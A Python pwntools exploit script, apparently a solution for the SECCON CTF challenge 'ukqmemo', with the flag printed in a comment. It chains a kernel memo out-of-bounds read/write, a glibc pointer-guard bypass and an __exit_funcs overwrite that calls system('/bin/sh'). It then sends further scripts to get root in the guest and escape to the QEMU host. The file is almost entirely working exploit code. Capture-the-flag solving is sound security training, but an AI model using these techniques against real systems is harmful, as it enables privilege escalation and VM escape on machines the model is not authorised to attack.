#!/usr/bin/env python3
import os.path

from pwn import *


def connect():
    if args.LOCAL:
        return remote("localhost", 6318)
    tube = remote("ukqmemo.seccon.games", 6318)
    hashcash = tube.recvline()
    assert re.match(rb"hashcash -mb\d+ [a-zA-Z0-9_]+", hashcash)
    token = subprocess.check_output(hashcash.decode(), shell=True)
    tube.sendline(token)
    return tube


LOGIN_DELIM = b"buildroot login:"
MENU_DELIM = b"\n> "
MENU_UMEMO = b"1"
MENU_KMEMO = b"2"
MENU_EXIT = b"0"
UMEMO_DELIM = b"\nM> "
READ = b"1"
WRITE = b"2"
BACK = b"0"
KMEMO_DELIM = b"\nS> "
RANGE_DELIM = b"Out of range"
OUTPUT_DELIM = b"Output: "
INPUT_DELIM = b"Input: "
LARGE_DELIM = b"Too large"
OFFSET_DELIM = b"Offset: "
LOGIN = b"ctf"
SHELL_DELIM = b"~ $"
ROOT_DELIM = b"~ #"
HOST_DELIM = b"sh: turning off NDELAY mode"
KMEMO_EXPLOIT_DELIM = b"kmemo: "
QMEMO_EXPLOIT_DELIM = b"qmemo: "
SIZE_DELIM = b"Size: "
INDEX_DELIM = b"Index: "
MEMOPAGE_SIZE_MAX = 0x40000000
MAX_SIZE = 0x400
PAGE_SIZE = 0x1000
OVERFLOW_OFFSET = MEMOPAGE_SIZE_MAX - PAGE_SIZE - 1
SIZEOF_MEMO = 0x100
# this character causes the pending tty buffer to
# be sent to the waiting user program without waiting for
# end-of-line
VEOF = b"\x04"


# stdlib/cxa_atexit.c:struct exit_function_list *__exit_funcs = &initial;
# enum
# {
#   ef_free,      /* `ef_free' MUST be zero!  */
#   ef_us,
#   ef_on,
#   ef_at,
#   ef_cxa
# };
#
# struct exit_function
#   {
#     /* `flavour' should be of type of the `enum' above but since we need
#        this element in an atomic operation we have to use `long int'.  */
#     long int flavor;
#     union
#       {
#         void (*at) (void);
#         struct
#           {
#             void (*fn) (int status, void *arg);
#             void *arg;
#           } on;
#         struct
#           {
#             void (*fn) (void *arg, int status);
#             void *arg;
#             void *dso_handle;
#           } cxa;
#       } func;
#   };
# struct exit_function_list
#   {
#     struct exit_function_list *next;
#     size_t idx;
#     struct exit_function fns[32];
#   };
EF_CXA = 4
LIBC_EXIT_FUNCS = 0x17D660
LIBC_PUTS = 0x5ED1E
LIBC_ABORT = 0x26346
LIBC_STACK_CHK_FAIL = 0xD9899
LIBC_SIZE = 0x18E000
SIZEOF_EXIT_FUNCTION_LIST = 0x30  # 1 x EF_CXA
LIBC_BIN_SH = 0x1445F0
LIBC_SYSTEM = 0x40FB7

# GDB said so. Somewhere in libc's BSS.
LIBC_FS_BASE = 0x18D680
LIBC_POINTER_GUARD = 0x30

# We cannot write 0x7f, because it's DEL.
# IEXTEN is off, so we cannot use VLNEXT.
# Therefore, do only partial overwrites.
# All addresses we are interested in are of the form 0x7f??????????.
BAD_CHARS = b"\x03\x04\x0a\x11\x13\x7f"
BEFORE_7F = 5


class Again(RuntimeError):
    def __init__(self, reason, data):
        self.reason = reason
        self.data = data


def try_pwn():
    with connect() as tube:
        print("Getting shell in the guest...")
        tube.sendlineafter(LOGIN_DELIM, LOGIN)
        tube.sendlineafter(MENU_DELIM, MENU_KMEMO)
        tube.sendlineafter(KMEMO_DELIM, READ)
        tube.sendlineafter(OFFSET_DELIM, str(OVERFLOW_OFFSET).encode())
        tube.sendlineafter(SIZE_DELIM, str(MAX_SIZE).encode())
        tube.recvuntil(OUTPUT_DELIM)
        leak = tube.recvuntil(KMEMO_DELIM)
        (memo0,) = struct.unpack("<Q", leak[1:9])
        print(f"memo0 = 0x{memo0:x}")
        memos = memo0 - SIZEOF_MEMO
        print(f"memos = 0x{memos:x}")
        assert memos & 0xFFF == 0
        libc = memos + 3 * PAGE_SIZE  # memos + 2 pages for TLS
        print(f"libc = 0x{libc:x}")

        def rw(addr, val_or_size):
            tube.sendline(WRITE)
            tube.sendlineafter(OFFSET_DELIM, str(OVERFLOW_OFFSET).encode())
            part = b"\x00" + struct.pack("<Q", addr)[:BEFORE_7F]
            if any(c in part for c in BAD_CHARS):
                raise Again("rw addr part", part)
            tube.sendlineafter(SIZE_DELIM, str(len(part)).encode())
            tube.sendafter(INPUT_DELIM, part + VEOF)

            tube.sendlineafter(KMEMO_DELIM, BACK)
            tube.sendlineafter(MENU_DELIM, MENU_UMEMO)
            if isinstance(val_or_size, int):
                tube.sendlineafter(UMEMO_DELIM, READ)
                tube.sendlineafter(INDEX_DELIM, b"0")
                tube.recvuntil(OUTPUT_DELIM)
                result = tube.recvn(val_or_size)
            else:
                if any(c in val_or_size for c in BAD_CHARS):
                    raise Again("rw val", val_or_size)
                tube.sendlineafter(UMEMO_DELIM, WRITE)
                tube.sendlineafter(INDEX_DELIM, b"0")
                tube.sendafter(INPUT_DELIM, val_or_size + VEOF)
                result = None

            tube.sendlineafter(UMEMO_DELIM, BACK)
            tube.sendlineafter(MENU_DELIM, MENU_KMEMO)

            return result

        (pointer_guard,) = struct.unpack(
            "<Q", rw(libc + LIBC_FS_BASE + LIBC_POINTER_GUARD, 8)
        )
        print(f"pointer_guard = 0x{pointer_guard:x}")

        def ptr_mangle(addr):
            addr ^= pointer_guard
            addr = ((addr << 17) & ((1 << 64) - 1)) | (addr >> 47)
            return addr

        fake_exit_funcs_addr = libc + 0x18C398
        print(f"fake_exit_funcs_addr = 0x{fake_exit_funcs_addr:x}")
        leak_bytes = rw(fake_exit_funcs_addr, SIZEOF_EXIT_FUNCTION_LIST)
        print(f"leak = {leak_bytes.hex()}")
        leak = struct.unpack("<QQQQQQ", leak_bytes)
        # exit_function_list.fns[0].cxa.flavor
        if leak[2] != EF_CXA:
            raise Again("leak[2]", leak_bytes)
        # exit_function_list.fns[0].cxa.arg
        if leak[4] & 0xFFFFFF0000000000 != 0x7F0000000000:
            raise Again("leak[4]", leak_bytes)
        print(f"fake_exit_funcs_addr = 0x{fake_exit_funcs_addr:x}")

        rw(
            libc + LIBC_EXIT_FUNCS,
            struct.pack("<Q", fake_exit_funcs_addr)[:BEFORE_7F],
        )

        rw(
            fake_exit_funcs_addr,
            struct.pack(
                "<QQ",
                0,  # exit_function_list.next
                1,  # exit_function_list.idx
            ),
        )
        # exit_function_list.fns[0].cxa.fn
        rw(
            fake_exit_funcs_addr + 3 * 8,
            struct.pack("<Q", ptr_mangle(libc + LIBC_SYSTEM)),
        )
        # exit_function_list.fns[0].cxa.arg
        rw(
            fake_exit_funcs_addr + 4 * 8,
            struct.pack("<Q", libc + LIBC_BIN_SH)[:BEFORE_7F],
        )
        # exit_function_list.fns[0].cxa.dso_handle
        rw(fake_exit_funcs_addr + 5 * 8, struct.pack("<Q", 0))

        (exit_funcs,) = struct.unpack("<Q", rw(libc + LIBC_EXIT_FUNCS, 8))
        print(f"sanity check: exit_funcs = 0x{exit_funcs:x}")
        assert exit_funcs == fake_exit_funcs_addr

        tube.sendlineafter(KMEMO_DELIM, BACK)
        tube.sendlineafter(MENU_DELIM, MENU_EXIT)
        delim = tube.recvuntil((SHELL_DELIM, LOGIN_DELIM))
        if delim.endswith(LOGIN_DELIM):
            raise Again("crash", delim)

        # SECCON{k3rn3l_bug5_5p1ll_0v3r_1n70_u53r_pr0gr4m5}
        tube.sendline(b"cat /flag1.txt")
        tube.recvline()  # echo
        print("flag1: " + tube.recvline().strip().decode())
        tube.recvuntil(SHELL_DELIM)

        # Fullchain time!
        print("Getting root in the guest...")
        kmemo = os.path.join(os.path.dirname(__file__), "..", "kmemo")
        subprocess.check_call(["make", "fmt", "pwnit.sh"], cwd=kmemo)
        with open(os.path.join(kmemo, "pwnit.sh"), "rb") as fp:
            tube.sendline(fp.read())
        while True:
            delim = tube.recvuntil((ROOT_DELIM, KMEMO_EXPLOIT_DELIM))
            if delim.endswith(ROOT_DELIM):
                break
            # Print messages from the kernel exploit.
            assert delim.endswith(KMEMO_EXPLOIT_DELIM)
            print(tube.recvline().strip().decode())

        print("Getting shell on the host...")
        qmemo = os.path.join(os.path.dirname(__file__), "..", "qmemo")
        subprocess.check_call(["make", "fmt", "pwnit.sh"], cwd=qmemo)
        with open(os.path.join(qmemo, "pwnit.sh"), "rb") as fp:
            tube.sendline(fp.read())
        while True:
            delim = tube.recvuntil((HOST_DELIM, QMEMO_EXPLOIT_DELIM))
            if delim.endswith(HOST_DELIM):
                break
            # Print messages from the QEMU exploit.
            assert delim.endswith(QMEMO_EXPLOIT_DELIM)
            print(tube.recvline().strip().decode())

        tube.interactive()


def main():
    while True:
        try:
            try_pwn()
            break
        except Again as again:
            print(f"Retrying due to {again.reason}: {again.data.hex()}")
            continue


if __name__ == "__main__":
    main()
